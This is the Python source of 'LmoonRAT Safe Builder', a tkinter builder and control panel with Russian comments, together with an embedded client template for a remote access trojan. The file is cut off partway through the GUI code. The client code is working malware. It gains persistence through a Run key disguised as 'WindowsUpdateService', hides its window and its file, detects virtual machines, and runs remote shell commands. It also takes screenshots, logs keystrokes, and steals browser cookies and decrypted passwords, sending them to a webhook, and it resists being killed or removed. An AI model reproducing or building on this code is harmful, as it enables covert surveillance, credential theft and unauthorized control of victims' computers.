import tkinter as tk
from tkinter import ttk, filedialog, messagebox, scrolledtext, Menu, simpledialog
import os
import sys
import shutil
import subprocess
import json
import threading
import socket
import time
import platform
import winreg
import ctypes
import random
import psutil
from datetime import datetime
import base64
import tempfile
import webbrowser
from PIL import Image, ImageTk

# ========== КОНФИГ БИЛДЕРА ==========
BUILD_DIR = "C:\\LmoonRAT_Builds"
if not os.path.exists(BUILD_DIR):
    os.makedirs(BUILD_DIR)

# ========== ШАБЛОН КЛИЕНТА ==========
CLIENT_TEMPLATE = r'''
import sys
import os
import socket
import threading
import ctypes
import winreg
import subprocess
import platform
import json
from datetime import datetime
import base64
import tempfile
import time
import psutil
import requests
import sqlite3
import browser_cookie3
import win32crypt
import shutil
import re

# === КОНФИГУРАЦИЯ КЛИЕНТА ===
SAFE_MODE = {SAFE_MODE}          # Режим безопасного тестирования
DEBUG_MODE = {DEBUG_MODE}        # Режим отладки
PERSISTENT = {PERSISTENT}        # Постоянная установка
HIDE_FILE = {HIDE_FILE}          # Скрыть файл после запуска
ANTI_KILL = {ANTI_KILL}          # Блокировка завершения процесса
STEAL_COOKIES = {STEAL_COOKIES}  # Перехват cookies
STEAL_PASSWORDS = {STEAL_PASSWORDS} # Перехват паролей
ANTI_VM = {ANTI_VM}              # Обнаружение виртуальной машины
WEBHOOK_URL = "{WEBHOOK_URL}"    # URL вебхука
ANTI_UNINSTALL = {ANTI_UNINSTALL} # Защита от удаления
FILE_EXTENSION = "{FILE_EXTENSION}" # Расширение файла

def set_autostart():
    """Добавление в автозагрузку"""
    if not PERSISTENT:
        if DEBUG_MODE:
            print("[DEBUG] Автозагрузка отключена по настройкам")
        return
        
    try:
        reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_WRITE) as key:
            winreg.SetValueEx(key, "WindowsUpdateService", 0, winreg.REG_SZ, sys.executable)
        if DEBUG_MODE:
            print(f"[DEBUG] Добавлено в автозагрузку: {sys.executable}")
    except Exception as e:
        if DEBUG_MODE:
            print(f"[DEBUG] Ошибка автозагрузки: {str(e)}")

def hide_window():
    """Скрытие окна консоли"""
    if SAFE_MODE or DEBUG_MODE:
        print("[DEBUG] Режим скрытия окна отключен")
        return
        
    kernel32 = ctypes.WinDLL('kernel32')
    user32 = ctypes.WinDLL('user32')
    hWnd = kernel32.GetConsoleWindow()
    if hWnd: 
        user32.ShowWindow(hWnd, 0)
        if DEBUG_MODE:
            print("[DEBUG] Окно скрыто")

def get_hwid():
    """Генерация уникального ID устройства"""
    try:
        hwid = subprocess.check_output('wmic csproduct get uuid', shell=True).decode().split('\n')[1].strip()
        return hwid if hwid else platform.node() + str(os.getpid())
    except:
        return platform.node() + str(os.getpid())

def safe_exit():
    """Безопасное самоудаление клиента"""
    try:
        # Удаление из автозагрузки
        try:
            reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_WRITE) as key:
                winreg.DeleteValue(key, "WindowsUpdateService")
        except:
            pass
        
        # Скрипт самоудаления
        bat_script = f"""
        @echo off
        timeout /t 3 /nobreak >nul
        del /f /q "{os.path.basename(sys.executable)}"
        del /f /q "%~f0"
        """
        
        # Сохраняем BAT-скрипт
        with open("uninstall.bat", "w") as f:
            f.write(bat_script)
            
        # Запускаем самоудаление
        subprocess.Popen("uninstall.bat", creationflags=subprocess.CREATE_NO_WINDOW)
        sys.exit(0)
        
    except Exception as e:
        if DEBUG_MODE:
            print(f"[DEBUG] Ошибка самоудаления: {str(e)}")

def anti_uninstall_protection():
    """Защита от удаления"""
    while ANTI_UNINSTALL and not SAFE_MODE:
        try:
            # Проверяем, существует ли файл
            if not os.path.exists(sys.executable):
                # Восстанавливаем файл
                shutil.copyfile(__file__, sys.executable)
                
            # Проверяем автозагрузку
            reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_READ) as key:
                value, _ = winreg.QueryValueEx(key, "WindowsUpdateService")
                if value != sys.executable:
                    set_autostart()
                    
        except Exception as e:
            if DEBUG_MODE:
                print(f"[DEBUG] Ошибка защиты: {str(e)}")
                
        time.sleep(60)

def is_virtual_machine():
    """Определение, работает ли в виртуальной среде"""
    if SAFE_MODE:
        return False
        
    try:
        # Проверка по имени компьютера
        computer_name = platform.node().lower()
        vm_keywords = ['vmware', 'virtual', 'vbox', 'qemu', 'xen', 'docker', 'kvm']
        if any(keyword in computer_name for keyword in vm_keywords):
            return True
            
        # Проверка через WMI
        try:
            import wmi
            c = wmi.WMI()
            for bios in c.Win32_BIOS():
                if any(keyword in bios.SerialNumber.lower() for keyword in vm_keywords):
                    return True
        except:
            pass
            
        # Проверка через процессы
        vm_processes = ['vmtoolsd.exe', 'vmwaretray.exe', 'vboxservice.exe']
        for proc in psutil.process_iter(['name']):
            if proc.info['name'].lower() in vm_processes:
                return True
                
    except:
        pass
        
    return False

class LmoonClient:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.connection = None
        self.hwid = get_hwid()
        self.os_info = f"{platform.system()} {platform.release()}"
        self.join_date = datetime.now().strftime("%Y-%m-%d %H:%M")
        self.is_vm = is_virtual_machine()
        self.functions = {
            "cmd": self.execute_command,
            "download": self.download_file,
            "screenshot": self.capture_screen,
            "keylog": self.start_keylogger,
            "info": self.send_system_info,
            "uninstall": self.uninstall_client,
            "get_cookies": self.steal_cookies,
            "get_passwords": self.steal_passwords,
            "persist": self.enable_persistence
        }
        
        # Информация для безопасного режима
        if SAFE_MODE:
            print("="*60)
            print("ВНИМАНИЕ: Вы запустили RAT-клиент в безопасном режиме!")
            print("Этот клиент НЕ будет:")
            print("  - Скрывать свое окно")
            print("  - Добавляться в автозагрузку")
            print("  - Выполнять скрытые действия")
            print("Для остановки просто закройте это окно.")
            print("="*60)
        
    def connect(self):
        while True:
            try:
                if SAFE_MODE:
                    print(f"[SAFE] Попытка подключения к {self.host}:{self.port}")
                    
                self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.connection.connect((self.host, self.port))
                
                if SAFE_MODE:
                    print("[SAFE] Успешное подключение к серверу")
                
                # Отправляем информацию о себе
                self.send_system_info()
                self.handle_connection()
            except Exception as e: 
                if SAFE_MODE:
                    print(f"[SAFE] Ошибка подключения: {str(e)}")
                time.sleep(30)
                
    def handle_connection(self):
        while True:
            try:
                data = self.connection.recv(4096).decode()
                if not data: 
                    if SAFE_MODE:
                        print("[SAFE] Соединение разорвано")
                    break
                
                if SAFE_MODE:
                    print(f"[SAFE] Получена команда: {data[:50]}...")
                
                cmd = data.split()[0]
                if cmd in self.functions:
                    self.functions[cmd](data)
            except Exception as e:
                if SAFE_MODE:
                    print(f"[SAFE] Ошибка обработки: {str(e)}")
                break
    
    def send_system_info(self, _=None):
        info = {
            "hwid": self.hwid,
            "os": self.os_info,
            "join_date": self.join_date,
            "status": "online",
            "ip": socket.gethostbyname(socket.gethostname()),
            "safe_mode": SAFE_MODE,
            "is_vm": self.is_vm
        }
        self.connection.send(json.dumps(info).encode())
    
    # Основные функции
    def execute_command(self, data):
        cmd = ' '.join(data.split()[1:])
        
        if SAFE_MODE:
            print(f"[SAFE] Выполнение команды: {cmd}")
        
        result = subprocess.getoutput(cmd)
        self.connection.send(result.encode())
        
    def download_file(self, data):
        filepath = data.split()[1]
        if SAFE_MODE:
            print(f"[SAFE] Запрос файла: {filepath}")
            
        if os.path.exists(filepath):
            with open(filepath, 'rb') as f:
                self.connection.send(base64.b64encode(f.read()))
    
    def capture_screen(self, _):
        try:
            if SAFE_MODE:
                print("[SAFE] Запрос скриншота экрана")
                
            from mss import mss
            with mss() as sct:
                filename = sct.shot(mon=-1, output='monitor.png')
                with open(filename, 'rb') as f:
                    self.connection.send(f.read())
            os.remove(filename)
        except:
            self.connection.send(b"Screenshot module not installed")
    
    def start_keylogger(self, _):
        try:
            if SAFE_MODE:
                print("[SAFE] Запуск кейлоггера (демо-режим)")
                self.connection.send(b"Keylogger simulation in safe mode")
                return
                
            from pynput import keyboard
            log = []
            
            def on_press(key):
                try: log.append(str(key.char))
                except: 
                    if key == keyboard.Key.space: log.append(' ')
                    elif key == keyboard.Key.enter: log.append('\\n')
            
            listener = keyboard.Listener(on_press=on_press)
            listener.start()
            
            time.sleep(30)
            listener.stop()
            self.connection.send(''.join(log).encode())
        except:
            self.connection.send(b"Keylogger module not installed")
    
    def uninstall_client(self, _):
        """Самоудаление клиента по команде сервера"""
        if SAFE_MODE:
            print("[SAFE] Получена команда на самоудаление")
            
        self.connection.send(b"Uninstalling client...")
        safe_exit()
        
    def steal_cookies(self, _):
        """Кража cookies браузеров"""
        if SAFE_MODE: 
            self.connection.send(b"Safe mode: cookies not stolen")
            return
            
        try:
            cookies_data = ""
            browsers = [
                browser_cookie3.chrome,
                browser_cookie3.firefox,
                browser_cookie3.edge,
                browser_cookie3.opera,
                browser_cookie3.brave
            ]
            
            for browser_fn in browsers:
                try:
                    for cookie in browser_fn(domain_name=''):
                        cookies_data += f"{cookie.domain}\tTRUE\t{cookie.path}\t{cookie.secure}\t{cookie.expires}\t{cookie.name}\t{cookie.value}\n"
                except Exception as e:
                    if DEBUG_MODE:
                        print(f"[DEBUG] Ошибка сбора cookies: {str(e)}")
            
            # Отправка в вебхук
            if WEBHOOK_URL and cookies_data:
                try:
                    requests.post(WEBHOOK_URL, data={"content": f"Cookies from {self.hwid}:\n{cookies_data}"}, timeout=10)
                except:
                    pass
                    
            self.connection.send(cookies_data.encode())
        except ImportError:
            self.connection.send(b"Cookie module not installed")
        except Exception as e:
            self.connection.send(f"Cookie error: {str(e)}".encode())
            
    def steal_passwords(self, _):
        """Кража паролей из браузеров"""
        if SAFE_MODE: 
            self.connection.send(b"Safe mode: passwords not stolen")
            return
            
        try:
            passwords_data = ""
            # Chrome
            try:
                login_db = os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Default', 'Login Data')
                if os.path.exists(login_db):
                    shutil.copy2(login_db, "chrome_data.db")
                    conn = sqlite3.connect("chrome_data.db")
                    cursor = conn.cursor()
                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
                    for row in cursor.fetchall():
                        url = row[0]
                        username = row[1]
                        encrypted_password = row[2]
                        try:
                            # Расшифровка пароля
                            decrypted_password = win32crypt.CryptUnprotectData(encrypted_password, None, None, None, 0)[1]
                            password = decrypted_password.decode()
                        except:
                            password = "[encrypted]"
                        passwords_data += f"URL: {url}\nUser: {username}\nPass: {password}\n\n"
                    conn.close()
                    os.remove("chrome_data.db")
            except Exception as e:
                if DEBUG_MODE:
                    print(f"[DEBUG] Ошибка сбора паролей Chrome: {str(e)}")
            
            # Firefox
            try:
                profiles_path = os.path.join(os.getenv('APPDATA'), 'Mozilla', 'Firefox', 'Profiles')
                if os.path.exists(profiles_path):
                    for profile in os.listdir(profiles_path):
                        if profile.endswith('.default-release'):
                            db_path = os.path.join(profiles_path, profile, 'logins.json')
                            if os.path.exists(db_path):
                                with open(db_path, 'r', encoding='utf-8') as f:
                                    data = json.load(f)
                                    for login in data.get('logins', []):
                                        passwords_data += f"URL: {login.get('hostname', '')}\nUser: {login.get('encryptedUsername', '')}\nPass: {login.get('encryptedPassword', '')}\n\n"
            except Exception as e:
                if DEBUG_MODE:
                    print(f"[DEBUG] Ошибка сбора паролей Firefox: {str(e)}")
            
            # Отправка в вебхук
            if WEBHOOK_URL and passwords_data:
                try:
                    requests.post(WEBHOOK_URL, data={"content": f"Passwords from {self.hwid}:\n{passwords_data}"}, timeout=10)
                except:
                    pass
                    
            self.connection.send(passwords_data.encode())
        except Exception as e:
            self.connection.send(f"Password error: {str(e)}".encode())
    
    def enable_persistence(self, _):
        """Включение постоянной установки по команде"""
        if SAFE_MODE:
            self.connection.send(b"Cannot enable persistence in safe mode")
            return
            
        try:
            set_autostart()
            self.connection.send(b"Persistence enabled successfully")
        except Exception as e:
            self.connection.send(f"Persistence error: {str(e)}".encode())
    
    def anti_kill_thread(self):
        """Защита от завершения процесса"""
        while ANTI_KILL and not SAFE_MODE:
            try:
                # Повышаем приоритет процесса
                current_pid = os.getpid()
                process = psutil.Process(current_pid)
                if platform.system() == 'Windows':
                    process.nice(psutil.HIGH_PRIORITY_CLASS)
                else:
                    process.nice(-10)
                    
                # Проверяем, не пытаются ли завершить процесс
                for proc in psutil.process_iter():
                    try:
                        if "taskkill" in proc.name().lower() and str(current_pid) in " ".join(proc.cmdline()):
                            proc.kill()
                    except:
                        pass
            except:
                pass
            time.sleep(30)

# Точка входа
if __name__ == "__main__":
    # Проверка безопасного режима
    if {SAFE_MODE}:
        print("Запуск в безопасном режиме активирован")
    
    hide_window()
    set_autostart()
    
    # Скрытие файла
    if HIDE_FILE and not SAFE_MODE:
        try:
            kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
            kernel32.SetFileAttributesW(sys.executable, 2)  # FILE_ATTRIBUTE_HIDDEN
        except:
            pass
    
    # Изменение расширения файла
    if FILE_EXTENSION and not SAFE_MODE:
        try:
            new_name = sys.executable + FILE_EXTENSION
            os.rename(sys.executable, new_name)
            sys.executable = new_name
        except:
            pass
    
    # Запуск клиента
    client = LmoonClient("{HOST}", {PORT})
    
    # Запуск защитных механизмов
    if ANTI_KILL and not SAFE_MODE:
        threading.Thread(target=client.anti_kill_thread, daemon=True).start()
        
    if ANTI_UNINSTALL and not SAFE_MODE:
        threading.Thread(target=anti_uninstall_protection, daemon=True).start()
    
    # Основное подключение
    threading.Thread(target=client.connect, daemon=True).start()
    
    # Бесконечный цикл с контролем нагрузки
    while True:
        time.sleep(1)
        # В безопасном режиме снижаем нагрузку
        if {SAFE_MODE}:
            time.sleep(10)
'''

# ========== GUI КОНТРОЛЛЕРА ==========
class RatController:
    def __init__(self, root):
        self.root = root
        root.title("LmoonRAT Safe Builder")
        root.geometry("1200x700")
        self.menu_visible = False
        
        # Инициализация переменных ДО setup_ui()
        self.hide_file = tk.BooleanVar(value=False)
        self.anti_kill = tk.BooleanVar(value=False)
        self.steal_cookies = tk.BooleanVar(value=False)
        self.steal_passwords = tk.BooleanVar(value=False)
        self.anti_vm = tk.BooleanVar(value=False)
        self.anti_uninstall = tk.BooleanVar(value=False)
        self.webhook_url = tk.StringVar(value="")
        self.file_extension = tk.StringVar(value="")
        
        self.setup_ui()
        self.clients = {}
        self.server_thread = None
        self.server_running = False
        self.start_server()
        
    def setup_ui(self):
        # Темный фон
        self.root.configure(bg="#1e1e1e")
        
        # Верхняя панель
        top_frame = tk.Frame(self.root, bg="#121212", height=50)
        top_frame.pack(fill=tk.X)
        
        # Кнопка меню (три полоски)
        self.menu_btn = tk.Button(top_frame, text="☰", bg="#121212", fg="white", bd=0, 
                                 font=("Arial", 16), command=self.toggle_menu)
        self.menu_btn.pack(side=tk.LEFT, padx=15)
        
        # Заголовок
        tk.Label(top_frame, text="LmoonRAT Safe Builder", bg="#121212", fg="#4CAF50", 
                font=("Arial", 14, "bold")).pack(side=tk.LEFT, padx=10)
        
        # Статус сервера
        self.server_status = tk.Label(top_frame, text="Server: Stopped", bg="#121212", fg="red", 
                                    font=("Arial", 10))
        self.server_status.pack(side=tk.RIGHT, padx=20)
        
        # Боковое меню
        self.menu_frame = tk.Frame(self.root, bg="#252526", width=200)
        self.menu_frame.pack(side=tk.LEFT, fill=tk.Y)
        self.menu_frame.pack_propagate(False)
        self.menu_frame.place(x=-200, y=50, height=650)
        
        # Стиль для кнопок меню
        menu_btn_style = {
            "bg": "#252526", "fg": "white", "bd": 0, 
            "font": ("Arial", 11), "anchor": "w",
            "padx": 20, "pady": 10, "width": 180
        }
        
        # Пункты меню
        tk.Button(self.menu_frame, text="👥 Пользователи", command=lambda: self.show_tab(0), **menu_btn_style).pack(fill=tk.X)
        tk.Button(self.menu_frame, text="🛠️ Билдер", command=lambda: self.show_tab(1), **menu_btn_style).pack(fill=tk.X)
        tk.Button(self.menu_frame, text="💻 Консоль", command=lambda: self.show_tab(2), **menu_btn_style).pack(fill=tk.X)
        tk.Button(self.menu_frame, text="⚙️ Настройки", command=lambda: self.show_tab(3), **menu_btn_style).pack(fill=tk.X)
        tk.Button(self.menu_frame, text="❓ Помощь", command=lambda: self.show_tab(4), **menu_btn_style).pack(fill=tk.X)
        tk.Button(self.menu_frame, text="🔒 Завершить", command=self.root.destroy, **menu_btn_style).pack(side=tk.BOTTOM, fill=tk.X)
        
        # Создаем вкладки
        self.tab_control = ttk.Notebook(self.root, style="Custom.TNotebook")
        style = ttk.Style()
        style.configure("Custom.TNotebook", background="#1e1e1e", borderwidth=0)
        style.configure("Custom.TNotebook.Tab", background="#2d2d2d", foreground="white", padding=[10, 5])
        style.map("Custom.TNotebook.Tab", background=[("selected", "#3e3e42")])
        
        # Вкладка: Пользователи
        self.tab_users = ttk.Frame(self.tab_control)
        self.setup_users_tab()
        
        # Вкладка: Билдер
        self.tab_builder = ttk.Frame(self.tab_control)
        self.setup_builder_tab()
        
        # Вкладка: Консоль
        self.tab_console = ttk.Frame(self.tab_control)
        self.setup_console_tab()
        
        # Вкладка: Настройки
        self.tab_settings = ttk.Frame(self.tab_control)
        self.setup_settings_tab()
        
        # Вкладка: Помощь
        self.tab_help = ttk.Frame(self.tab_control)
        self.setup_help_tab()
        
        self.tab_control.add(self.tab_users, text='Пользователи')
        self.tab_control.add(self.tab_builder, text='Билдер')
        self.tab_control.add(self.tab_console, text='Консоль')
        self.tab_control.add(self.tab_settings, text='Настройки')
        self.tab_control.add(self.tab_help, text='Помощь')
        self.tab_control.place(x=0, y=50, width=1200, height=650)
        self.tab_control.select(0)  # Выбираем первую вкладку
        
        # Статус бар
        self.status = tk.Label(self.root, text="Готов к работе", 
                             bg="#007acc", fg="white", anchor=tk.W)
        self.status.pack(fill=tk.X, side=tk.BOTTOM)
    
    def toggle_menu(self):
        """Показ/скрытие бокового меню"""
        x_pos = 0 if self.menu_visible else -200
        self.menu_frame.place(x=x_pos, y=50, height=650)
        self.menu_visible = not self.menu_visible
    
    def show_tab(self, index):
        """Показать выбранную вкладку"""
        tabs = self.tab_control.tabs()
        if index < len(tabs):
            self.tab_control.select(tabs[index])
        
        # Закрываем меню после выбора
        self.menu_frame.place(x=-200, y=50, height=650)
        self.menu_visible = False
    
    def setup_users_tab(self):
        frame = ttk.Frame(self.tab_users)
        frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Таблица пользователей
        columns = ("IP", "Страна", "ID", "Без.режим", "ОС", "Статус", "Дата")
        self.tree = ttk.Treeview(frame, columns=columns, show="headings", height=20, style="Custom.Treeview")
        
        # Настройка стиля
        style = ttk.Style()
        style.configure("Custom.Treeview", background="#2d2d2d", foreground="white", fieldbackground="#2d2d2d")
        style.configure("Custom.Treeview.Heading", background="#3e3e42", foreground="white")
        style.map("Custom.Treeview", background=[('selected', '#007acc')])
        
        # Настройка колонок
        col_widths = [120, 80, 150, 80, 150, 80, 120]
        for col, width in zip(columns, col_widths):
            self.tree.heading(col, text=col)
            self.tree.column(col, width=width, anchor=tk.CENTER)
        
        # Скроллбар
        scrollbar = ttk.Scrollbar(frame, orient="vertical", command=self.tree.yview)
        self.tree.configure(yscrollcommand=scrollbar.set)
        
        scrollbar.pack(side=tk.RIGHT, fill=tk.Y)
        self.tree.pack(fill=tk.BOTH, expand=True)
        
        # Панель инструментов
        toolbar = tk.Frame(frame, bg="#2d2d2d")
        toolbar.pack(fill=tk.X, pady=5)
        
        actions = [
            ("Обновить", self.refresh_clients, "#4CAF50"),
            ("Выполнить команду", self.execute_selected, "#2196F3"),
            ("Скриншот", self.screenshot_selected, "#FF9800"),
            ("Получить пароли", self.get_passwords, "#E91E63"),
            ("Удалить", self.uninstall_selected, "#f44336"),
        ]
        
        for text, command, color in actions:
            btn = tk.Button(toolbar, text=text, bg=color, fg="white", bd=0, command=command)
            btn.pack(side=tk.LEFT, padx=5, ipadx=10, ipady=3)
    
    def setup_builder_tab(self):
        frame = ttk.Frame(self.tab_builder)
        frame.pack(fill=tk.BOTH, expand=True, padx=15, pady=15)
        
        # Основные настройки
        main_settings = ttk.LabelFrame(frame, text="Основные настройки")
        main_settings.pack(fill=tk.X, padx=5, pady=5)
        
        # Сетка для основных настроек
        tk.Label(main_settings, text="IP сервера:").grid(row=0, column=0, sticky="w", padx=5, pady=5)
        self.ip_entry = tk.Entry(main_settings, width=25)
        self.ip_entry.insert(0, "127.0.0.1")
        self.ip_entry.grid(row=0, column=1, padx=5, pady=5)
        
        tk.Label(main_settings, text="Порт:").grid(row=0, column=2, sticky="w", padx=5, pady=5)
        self.port_entry = tk.Entry(main_settings, width=10)
        self.port_entry.insert(0, "7777")
        self.port_entry.grid(row=0, column=3, padx=5, pady=5)
        
        tk.Label(main_settings, text="Имя файла:").grid(row=1, column=0, sticky="w", padx=5, pady=5)
        self.filename_entry = tk.Entry(main_settings, width=25)
        self.filename_entry.insert(0, "WindowsUpdate")
        self.filename_entry.grid(row=1, column=1, padx=5, pady=5)
        
        tk.Label(main_settings, text="Расширение:").grid(row=1, column=2, sticky="w", padx=5, pady=5)
        self.extension_entry = tk.Entry(main_settings, width=10)
        self.extension_entry.insert(0, ".exe")
        self.extension_entry.grid(row=1, column=3, padx=5, pady=5)
        
        tk.Label(main_settings, text="Иконка:").grid(row=2, column=0, sticky="w", padx=5, pady=5)
        self.icon_path = tk.StringVar()
        tk.Entry(main_settings, textvariable=self.icon_path, width=20).grid(row=2, column=1, padx=5, pady=5, sticky="w")
        tk.Button(main_settings, text="Обзор", command=self.select_icon, width=8).grid(row=2, column=2, padx=5, pady=5)
        
        # Настройки безопасности
        sec_settings = ttk.LabelFrame(frame, text="Настройки безопасности")
        sec_settings.pack(fill=tk.X, padx=5, pady=5)
        
        # Сетка для настроек безопасности
        self.safe_mode = tk.BooleanVar(value=True)
        tk.Checkbutton(
            sec_settings, 
            text="Безопасный режим (для теста)", 
            variable=self.safe_mode,
            bg="#1e1e1e", fg="white", selectcolor="#3e3e42"
        ).grid(row=0, column=0, sticky="w", padx=5, pady=5)
        
        self.debug_mode = tk.BooleanVar(value=True)
        tk.Checkbutton(
            sec_settings, 
            text="Режим отладки", 
            variable=self.debug_mode,
            bg="#1e1e1e", fg="white", selectcolor="#3e3e42"
        ).grid(row=0, column=1, sticky="w", padx=5, pady=5)
        
        self.persistent_mode = tk.BooleanVar(value=False)
        tk.Checkbutton(
            sec_settings, 
            text="Автозагрузка", 
            variable=self.persistent_mode,
            bg="#1e1e1e", fg="white", selectcolor="#3e3e42"
        ).grid(row=0, column=2, sticky="w", padx=5, pady=5)
        
        # Дополнительные функции
        func_settings = ttk.LabelFrame(frame, text="Дополнительные функции")
        func_settings.pack(fill=tk.X, padx=5, pady=5)
        
        # Сетка для дополнительных функций
        tk.Checkbutton(
            func_settings, 
            text="Скрыть файл", 
            variable=self.hide_file,
            bg="#1e1e1e", fg="white", selectcolor="#3e3e42"
        ).grid(row=0, column=0, sticky="w", padx=5, pady=5)
        
        tk.Checkbutton(
            func_settings, 
            text="Anti-Kill", 
            variable=self.anti_kill,
            bg="#1e1e1e", fg="white", selectcolor="#3e3e42"
        ).grid(row=0, column=1, sticky="w", padx=5, pady=5)
        
        tk.Checkbutton(
            func_settings, 
            text="Anti-Uninstall", 
            variable=self.anti_uninstall,
            bg="#1e1e1e", fg="white", selectcolor="#3e3e42"
        ).grid(row=0, column=2, sticky="w", padx=5, pady=5)
        
        tk.Checkbutton(
            func_settings, 
            text="Anti-VM", 
            variable=self.anti_vm,
            bg="#1e1e1e", fg="white", selectcolor="#3e3e42"
        ).grid(row=1, column=0, sticky="w", padx=5, pady=5)
        
        tk.Checkbutton(
            func_settings, 
            text="Steal Cookies", 
            variable=self.steal_cookies,
            bg="#1e1e1e", fg="white", selectcolor="#3e3e42"
        ).grid(row=1, column=1, sticky="w", padx=5, pady=5)
        
        tk.Checkbutton(
            func_settings, 
            text="Steal Passwords", 
            variable=self.steal_passwords,
            bg="#1e1e1e", fg="white", selectcolor="#3e3e42"
        ).grid(row=1, column=2, sticky="w", padx=5, pady=5)
        
        # Поле для вебхука
        webhook_frame = tk.Frame(func_settings, bg="#1e1e1e")
        webhook_frame.grid(row=2, column=0, columnspan=3, sticky="we", padx=5, pady=5)
        
        tk.Label(webhook_frame, text="Webhook URL:", bg="#1e1e1e", fg="white").pack(side=tk.LEFT, padx=5)
        self.webhook_entry = tk.Entry(webhook_frame, width=50, textvariable=self.webhook_url)
        self.webhook_entry.pack(side=tk.LEFT, padx=5, fill=tk.X, expand=True)
        
        # Кнопка сборки
        build_frame = tk.Frame(frame, bg="#1e1e1e")
        build_frame.pack(fill=tk.X, pady=10)
        
        tk.Button(build_frame, text="Собрать клиент", command=self.build_client, 
                 bg="#4CAF50", fg="white", font=("Arial", 12), width=15).pack(side=tk.LEFT, padx=5)
        
        tk.Button(build_frame, text="Открыть папку сборки", command=self.open_build_dir, 
                 bg="#2196F3", fg="white").pack(side=tk.LEFT, padx=5)
        
        # Консоль вывода
        console_frame = ttk.LabelFrame(frame, text="Лог сборки")
        console_frame.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        self.console = scrolledtext.ScrolledText(console_frame, bg="#2d2d2d", fg="#73daca", height=10)
        self.console.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        self.console.insert(tk.END, "Готов к сборке безопасных клиентов...\n")
        self.console.insert(tk.END, "Рекомендуется использовать безопасный режим для тестов!\n\n")
    
    def setup_console_tab(self):
        frame = ttk.Frame(self.tab_console)
        frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        self.cmd_output = scrolledtext.ScrolledText(frame, bg="#2d2d2d", fg="#73daca", height=20)
        self.cmd_output.pack(fill=tk.BOTH, expand=True, padx=5, pady=5)
        
        input_frame = tk.Frame(frame, bg="#1e1e1e")
        input_frame.pack(fill=tk.X, pady=5)
        
        self.cmd_entry = tk.Entry(input_frame, width=50, bg="#3e3e42", fg="white")
        self.cmd_entry.pack(side=tk.LEFT, fill=tk.X, expand=True, padx=5, ipady=3)
        
        tk.Button(input_frame, text="Выполнить", command=self.execute_command, 
                 bg="#4CAF50", fg="white").pack(side=tk.RIGHT, padx=5, ipadx=10)
    
    def setup_settings_tab(self):
        frame = ttk.Frame(self.tab_settings)
        frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Настройки сервера
        server_frame = ttk.LabelFrame(frame, text="Настройки сервера")
        server_frame.pack(fill=tk.X, padx=5, pady=5)
        
        tk.Label(server_frame, text="Порт сервера:").grid(row=0, column=0, sticky="w", padx=5, pady=5)
        self.server_port = tk.IntVar(value=7777)
        tk.Entry(server_frame, textvariable=self.server_port, width=10).grid(row=0, column=1, padx=5, pady=5)
        
        tk.Label(server_frame, text="Макс. подключений:").grid(row=0, column=2, sticky="w", padx=5, pady=5)
        self.max_clients = tk.IntVar(value=100)
        tk.Entry(server_frame, textvariable=self.max_clients, width=10).grid(row=0, column=3, padx=5, pady=5)
        
        # Настройки безопасности
        sec_frame = ttk.LabelFrame(frame, text="Настройки безопасности")
        sec_frame.pack(fill=tk.X, padx=5, pady=5)
        
        self.auto_clean = tk.BooleanVar(value=True)
        tk.Checkbutton(
            sec_frame, 
            text="Автоочистка временных файлов", 
            variable=self.auto_clean,
            bg="#1e1e1e", fg="white", selectcolor="#3e3e42"
        ).grid(row=0, column=0, sticky="w", padx=5, pady=5)
        
        self.auto_start = tk.BooleanVar(value=False)
        tk.Checkbutton(
            sec_frame, 
            text="Автозапуск после сборки", 
            variable=self.auto_start,
            bg="#1e1e1e", fg="white", selectcolor="#3e3e42"
        ).grid(row=0, column=1, sticky="w", padx=5, pady=5)
        
        self.encrypt_exe = tk.BooleanVar(value=False)
        tk.Checkbutton(
            sec_frame, 
            text="Шифрование исполняемого файла", 
            variable=self.encrypt_exe,
            bg="#1e1e1e", fg="white", selectcolor="#3e3e42"
        ).grid(row=0, column=2, sticky="w", padx=5, pady=5)
        
        # Кнопки
        btn_frame = tk.Frame(frame, bg="#1e1e1e")
        btn_frame.pack(fill=tk.X, pady=10)
        
        tk.Button(btn_frame, text="Сохранить настройки", command=self.save_settings, 
                 bg="#4CAF50", fg="white").pack(side=tk.LEFT, padx=5)
        
        tk.Button(btn_frame, text="Сбросить настройки", command=self.restore_defaults, 
                 bg="#2196F3", fg="white").pack(side=tk.LEFT, padx=5)
    
    def setup_help_tab(self):
        frame = ttk.Frame(self.tab_help)
        frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Информационный текст
        help_text = """
        LmoonRAT Safe Builder - Руководство пользователя
        
        1. Вкладка "Пользователи"
        - Отображает подключенных клиентов
        - ПКМ для вызова контекстного меню
        - Обновление списка кнопкой Refresh
        
        2. Вкладка "Билдер"
        - Сборка клиента с настраиваемыми параметрами
        - Выбор иконки через Browse
        - Настройки безопасности
        
        3. Вкладка "Консоль"
        - Отправка команд всем подключенным клиентам
        - Просмотр результатов выполнения
        
        4. Вкладка "Настройки"
        - Конфигурация параметров сервера
        - Дополнительные настройки безопасности
        
        5. Боковое меню
        - Быстрый доступ ко всем функциям
        
        Безопасный режим:
        - Рекомендуется для тестов на основном ПК
        - Отключает все опасные функции
        - Позволяет легко удалить клиент
        
        Для получения дополнительной помощи:
        - Используйте меню Help
        - Посетите наш сайт: example.com
        """
        
        help_label = tk.Label(frame, text=help_text, justify=tk.LEFT, anchor="w", 
                             bg="#1e1e1e", fg="white")
        help_label.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Кнопки быстрого доступа
